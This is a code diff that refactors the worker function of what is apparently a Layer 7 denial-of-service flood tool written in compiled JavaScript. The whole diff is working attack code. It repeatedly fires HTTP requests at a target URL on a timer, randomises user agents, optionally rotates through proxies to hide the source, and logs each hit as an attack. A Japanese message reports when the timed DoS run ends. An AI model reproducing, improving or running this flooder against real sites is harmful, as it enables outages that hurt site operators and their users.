@@ -26,77 +26,41 @@ const white = `\u001b[0m`;
 function layer7_worker(targetUrl, requestType, proxySelect, interval, time, threads, proxies, currentThread) {
     return __awaiter(this, void 0, void 0, function* () {
         let dosInterval;
-        if (proxySelect === "ON") {
-            dosInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
-                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-                const [host, port] = proxy.split(":");
-                try {
-                    yield (0, axios_1.default)({
-                        url: targetUrl.trim(),
-                        method: requestType.trim(),
-                        headers: {
-                            "User-Agent": (0, ua_gen_1.UAGen)().trim(),
-                        },
-                        httpsAgent: new https_proxy_agent_1.HttpsProxyAgent(`http://${host.trim()}:${parseInt(port.trim())}`),
-                        timeout: 3000,
-                    }).then((response) => {
-                        if (response.status === 200) {
-                            console.log(`${green}✓${white}${proxy.trim()} -> ${targetUrl}`);
-                        }
-                        else {
-                            console.log(`${red}x${white}${proxy.trim()} -> ${targetUrl}`);
-                        }
-                    });
-                }
-                catch (error) {
-                    if (error.code === "ECONNABORTED") {
-                        console.error(`${yellow}△${white} Connection time out.`);
-                    }
-                    console.log(`${yellow}△${white}${proxy.trim()} is timed out. ${error}`);
-                }
-            }), interval);
-            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
-                clearInterval(dosInterval);
-                yield (0, sleep_1.sleep)(3000);
-                console.log(`Thread: ${currentThread} | ✓${time}秒間のDosが終了しました。`);
-                if (currentThread === threads) {
-                }
-            }), time * 1000);
-        }
-        else {
-            dosInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
-                try {
-                    yield (0, axios_1.default)({
-                        url: targetUrl.trim(),
-                        method: requestType.trim(),
-                        headers: {
-                            "User-Agent": (0, ua_gen_1.UAGen)().trim(),
-                        },
-                        timeout: 3000,
-                    }).then((response) => {
-                        if (response.status === 200) {
-                            console.log(`${green}✓${white}Attack -> ${targetUrl}`);
-                        }
-                        else {
-                            console.log(`${red}x${white}Failed`);
-                        }
-                    });
-                }
-                catch (error) {
-                    if (error.code === "ECONNABORTED") {
-                        console.error(`${yellow}△${white} Connection time out.`);
+        dosInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
+            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+            const [host, port] = proxy.split(":");
+            try {
+                yield (0, axios_1.default)({
+                    url: targetUrl.trim(),
+                    method: requestType.trim(),
+                    headers: {
+                        "User-Agent": (0, ua_gen_1.UAGen)().trim(),
+                    },
+                    httpsAgent: proxySelect === "ON" ? new https_proxy_agent_1.HttpsProxyAgent(`http://${host.trim()}:${parseInt(port.trim())}`) : undefined,
+                    timeout: 3000,
+                }).then((response) => {
+                    if (response.status === 200) {
+                        console.log(`${green}✓${white}${proxy.trim()} -> ${targetUrl}`);
                     }
                     else {
-                        console.log(`${yellow}△${white} Connection time out.`);
+                        console.log(`${red}x${white}${proxy.trim()} -> ${targetUrl}`);
                     }
+                });
+            }
+            catch (error) {
+                if (error.code === "ECONNABORTED") {
+                    console.error(`${yellow}△${white} Connection time out.`);
                 }
-            }), interval);
-            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
-                clearInterval(dosInterval);
-                yield (0, sleep_1.sleep)(3000);
-                console.log(`Thread: ${currentThread} | ✓${time}秒間のDosが終了しました。`);
-            }), time * 1000);
-        }
+                console.log(`${yellow}△${white}${proxy.trim()} is timed out. ${error}`);
+            }
+        }), interval);
+        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
+            clearInterval(dosInterval);
+            yield (0, sleep_1.sleep)(3000);
+            console.log(`Thread: ${currentThread} | ✓${time}秒間のDosが終了しました。`);
+            if (currentThread === threads) {
+            }
+        }), time * 1000);
     });
 }
 layer7_worker(worker_threads_1.workerData.targetUrl, worker_threads_1.workerData.requestType, worker_threads_1.workerData.proxySelect, worker_threads_1.workerData.interval, worker_threads_1.workerData.time, worker_threads_1.workerData.threads, worker_threads_1.workerData.proxies, worker_threads_1.workerData.currentThread).then(() => {
